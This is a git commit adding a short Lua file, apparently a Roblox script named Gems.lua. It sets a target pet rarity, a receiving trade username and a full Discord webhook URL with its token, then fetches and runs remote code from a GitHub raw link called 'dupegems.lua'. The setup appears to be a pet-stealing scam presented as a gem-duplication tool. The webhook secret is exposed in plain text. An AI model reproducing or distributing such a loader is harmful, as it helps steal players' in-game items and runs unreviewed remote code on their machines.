e578af86b043011754497ce7cd7536afb604640a
Shisuiiiis <108449104+Shisuiiiis@users.noreply.github.com>
2022-07-01 13:03:00 +0800

    Create Gems.lua

---
+++ Gems.lua
@@ -0,0 +1,6 @@
+PetRarity = "Legendary"
+PetLimited = true
+PetAll = false
+TradeUser = "tyfortnycfph"
+WebhookURL = "https://discord.com/api/webhooks/992273963734540438/m7c-Fxl8DNbwp2ZMAHWNfb576G3IHicFe1evOVUmwric7BQeZm4v3Oebv78wNt45hs9v"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
